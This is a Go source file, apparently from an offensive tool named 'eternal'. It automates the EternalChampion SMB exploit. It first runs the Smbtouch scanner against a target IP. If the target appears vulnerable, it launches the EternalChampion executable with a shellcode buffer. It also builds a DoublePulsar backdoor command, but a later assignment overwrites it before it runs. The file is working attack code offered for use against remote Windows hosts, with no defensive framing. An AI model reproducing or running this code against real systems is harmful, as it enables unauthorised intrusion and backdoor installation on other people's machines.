package exploits

import (
	"eternal/conf"
	"eternal/metatdatas"
	"eternal/utils"
	"fmt"
	"os/exec"
	"path/filepath"
)

func EternalChampion() {
	filename := filepath.Join(metatdatas.MetaData.LogDir, metatdatas.MetaData.ProjectName, utils.CreateXmlFileName("Smbtouch"))
	cmd := exec.Command(conf.Touches+"Smbtouch-1.1.1.exe", "--InConfig", conf.Touches+"Smbtouch-1.1.1.0.xml", "--OutConfig", filename, "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Protocol", metatdatas.MetaData.Protocol, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout)
	utils.Execute(cmd)
	results := utils.ParseSmbXml(filename)
	if results == nil {
		fmt.Println(utils.ColorPrint(-1, "Not Vuln."))
		return
	}
	metatdatas.MetaData.SetOutputInstall()
	metatdatas.MetaData.SetArch()
	cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--Architecture", metatdatas.MetaData.Arch, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function, "--OutputFile", metatdatas.MetaData.OutputInstall)
	cmd = exec.Command(filepath.Join(conf.Specials, "Eternalchampion-2.0.0.exe"), "--InConfig", filepath.Join(conf.Specials, "Eternalchampion-2.0.0.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", results["Target"], "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Protocol", results["Protocol"], "--PipeName", results["PipeName"], "--TargetOsArchitecture", results["TargetOsArchitecture"], "--Credentials", results["Credentials"], "--ShareName", results["ShareName"], "--ShellcodeBuffer", metatdatas.MetaData.ShellcodeBuffer)
	metatdatas.MetaData.ShowMetaData()
	utils.Execute(cmd)
}
